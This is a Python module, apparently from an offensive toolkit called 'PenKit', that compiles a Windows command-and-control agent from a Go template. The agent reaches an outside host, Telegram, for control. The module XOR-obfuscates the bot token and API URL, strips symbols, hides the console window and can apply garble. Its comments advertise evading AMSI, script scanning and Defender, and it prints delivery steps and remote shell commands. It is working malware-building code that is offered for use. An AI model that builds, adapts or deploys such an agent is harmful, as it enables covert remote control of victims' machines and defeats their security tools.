"""
Go-Agent Builder — kompiliert einen Windows EXE C2-Agent aus dem Go-Template.

Vorteile gegenüber PS1:
  - Kein PowerShell → kein AMSI
  - Kein Script-Scanning
  - XOR-obfuskierte Credentials (kein Klartext im Binary)
  - Symbols stripped → schwerer zu reverse-engineeren
  - Läuft überall: kein HTTP-Server nötig nach Delivery
"""
from __future__ import annotations
import os
import random
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Go Agent Builder",
    description="Kompiliert Windows EXE C2-Agent (Go, XOR-obfuskiert, keine PS1-Signaturen).",
    usage="Token + Chat-ID eingeben → agent.exe wird gebaut.",
    danger_note="⛔ BLACK — nur auf autorisierten Zielen.",
    example="agent.exe startet, meldet sich via Telegram, antwortet auf !shell Befehle",
)

DANGER = DangerLevel.BLACK

_TMPL = Path(__file__).parent / "go_agent" / "agent.go.tmpl"
_GOMOD = "module agent\n\ngo 1.21\n"


def is_go_available() -> bool:
    return shutil.which("go") is not None


def _xenc(s: str, key: int) -> str:
    """String → Go byte-array literal (XOR encoded)."""
    return ','.join(f'0x{b ^ key:02X}' for b in s.encode('utf-8'))


def generate_source(token: str, chat_id: str, interval: int = 10) -> tuple[str, int]:
    """Returns (go_source, xor_key)."""
    key = random.randint(0x11, 0x7E)
    tmpl = _TMPL.read_text()
    src = (
        tmpl
        .replace('TMPL_XOR_KEY',  f'0x{key:02X}')
        .replace('TMPL_ENC_API',  _xenc("https://api.telegram.org/bot", key))
        .replace('TMPL_ENC_TOKEN', _xenc(token, key))
        .replace('TMPL_ENC_CHAT',  _xenc(chat_id, key))
        .replace('TMPL_SLEEP',    '3')
        .replace('TMPL_INTERVAL', str(interval))
    )
    return src, key


def build(
    token: str,
    chat_id: str,
    output_dir: str,
    interval: int = 10,
    use_garble: bool = False,
) -> tuple[str | None, str]:
    """
    Kompiliert agent.exe.
    Returns (path_to_exe | None, stderr_log).
    """
    if not is_go_available():
        return None, "Go nicht installiert (apt install golang)"

    src, key = generate_source(token, chat_id, interval)
    out_exe = os.path.join(output_dir, "agent.exe")

    with tempfile.TemporaryDirectory() as tmp:
        Path(tmp, "go.mod").write_text(_GOMOD)
        Path(tmp, "main.go").write_text(src)

        env = os.environ.copy()
        env.update({"GOOS": "windows", "GOARCH": "amd64", "CGO_ENABLED": "0"})

        if use_garble and shutil.which("garble"):
            cmd = ["garble", "-seed=random", "build",
                   "-ldflags=-s -w -H windowsgui", "-trimpath", "-o", out_exe, "."]
        else:
            cmd = ["go", "build",
                   "-ldflags=-s -w -H windowsgui", "-trimpath", "-o", out_exe, "."]

        r = subprocess.run(cmd, capture_output=True, text=True, env=env, cwd=tmp)

    if os.path.exists(out_exe):
        return out_exe, r.stderr
    return None, r.stderr or "Build fehlgeschlagen (unbekannter Fehler)"


async def run(
    token: str,
    chat_id: str,
    output_dir: str,
    interval: int = 10,
) -> AsyncGenerator[str, None]:
    """Stream-Output für PenKit-Menü."""
    yield "[*] Kompiliere Go-Agent für Windows x64..."
    yield f"[*] Keine PS1-Signaturen — kein AMSI — direkte EXE"
    yield ""

    garble_ok = bool(shutil.which("garble"))
    if garble_ok:
        yield "[*] garble gefunden → erweiterte Obfuskierung aktiv"
    else:
        yield "[!] garble nicht gefunden → Standard-Build (ausreichend für die meisten Defender)"
        yield "    (Optional: go install mvdan.cc/garble@latest)"
    yield ""

    exe, err = build(token, chat_id, output_dir, interval, use_garble=garble_ok)

    if exe:
        size = os.path.getsize(exe)
        yield f"[+] agent.exe gebaut: {exe}"
        yield f"[+] Größe: {size:,} Bytes"
        yield ""
        yield "[*] Delivery:"
        yield f"    Direkt ausführen:  agent.exe"
        yield f"    Via HTA/HTTP:      Auto-Delivery benutzt agent.exe automatisch"
        yield ""
        yield "[*] Nach Ausführung auf Ziel:"
        yield "    → Telegram-Nachricht '🟢 Agent online [Go]'"
        yield "    → Befehle: !whoami  !ipconfig  !sysinfo  !exit"
    else:
        yield f"[!] Build fehlgeschlagen:"
        for line in err.strip().splitlines():
            yield f"    {line}"
